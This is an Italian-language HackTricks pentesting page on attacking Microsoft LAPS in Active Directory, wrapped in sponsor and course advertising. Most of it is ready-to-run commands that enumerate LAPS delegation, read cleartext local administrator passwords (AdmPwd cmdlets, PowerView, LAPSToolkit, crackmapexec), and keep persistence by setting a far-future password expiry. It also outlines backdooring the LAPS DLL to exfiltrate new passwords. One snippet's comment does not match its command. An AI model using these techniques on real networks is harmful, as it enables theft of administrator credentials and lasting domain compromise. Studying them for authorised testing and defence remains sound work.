# LAPS

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo di hacktricks](https://github.com/carlospolop/hacktricks) e al [repo di hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Informazioni di Base

Local Administrator Password Solution (LAPS) è uno strumento utilizzato per gestire un sistema in cui le **password degli amministratori**, che sono **uniche, generate casualmente e cambiate frequentemente**, vengono applicate ai computer connessi al dominio. Queste password sono memorizzate in modo sicuro all'interno di Active Directory e sono accessibili solo agli utenti a cui è stata concessa l'autorizzazione tramite le Liste di Controllo Accessi (ACL). La sicurezza delle trasmissioni delle password dal client al server è garantita dall'uso di **Kerberos versione 5** e **Advanced Encryption Standard (AES)**.

Negli oggetti computer del dominio, l'implementazione di LAPS comporta l'aggiunta di due nuovi attributi: **`ms-mcs-AdmPwd`** e **`ms-mcs-AdmPwdExpirationTime`**. Questi attributi memorizzano rispettivamente la **password dell'amministratore in testo normale** e **il suo tempo di scadenza**.

### Verifica se attivato
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Accesso alla password di LAPS

È possibile **scaricare la policy LAPS grezza** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e quindi utilizzare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile dall'utente.

Inoltre, i **cmdlet PowerShell nativi di LAPS** possono essere utilizzati se sono installati su una macchina a cui abbiamo accesso:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** può anche essere utilizzato per scoprire **chi può leggere la password e leggerla**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Il [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l'enumerazione di LAPS con diverse funzioni. Uno di questi è il parsing di **`ExtendedRights`** per **tutti i computer con LAPS abilitato**. Questo mostrerà i **gruppi** specificamente **delegati alla lettura delle password LAPS**, che spesso sono utenti in gruppi protetti. Un **account** che ha **unito un computer** a un dominio riceve `All Extended Rights` su quell'host, e questo diritto conferisce all'**account** la capacità di **leggere le password**. L'enumerazione può mostrare un account utente che può leggere la password LAPS su un host. Questo può aiutarci a **individuare utenti AD specifici** che possono leggere le password LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping Password di LAPS con Crackmapexec**
Se non c'è accesso a un powershell, è possibile abusare di questo privilegio in remoto tramite LDAP utilizzando
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **Persistenza LAPS**

### **Data di Scadenza**

Una volta ottenuti i privilegi di amministratore, è possibile **ottenere le password** e **impedire** a una macchina di **aggiornare** la sua **password** impostando la data di scadenza **in futuro**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
La password verrà comunque reimpostata se un **amministratore** utilizza il cmdlet **`Reset-AdmPwdPassword`**; o se è abilitata l'opzione **Non consentire un tempo di scadenza della password più lungo di quanto richiesto dalla policy** nella GPO di LAPS.
{% endhint %}

### Backdoor

Il codice sorgente originale per LAPS può essere trovato [qui](https://github.com/GreyCorbel/admpwd), quindi è possibile inserire un backdoor nel codice (all'interno del metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs` ad esempio) che in qualche modo **esfiltrerà nuove password o le memorizzerà da qualche parte**.

Quindi, compilare il nuovo `AdmPwd.PS.dll` e caricarlo sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (e modificare l'orario di modifica).

## Riferimenti
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al [repo hacktricks](https://github.com/carlospolop/hacktricks) e al [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
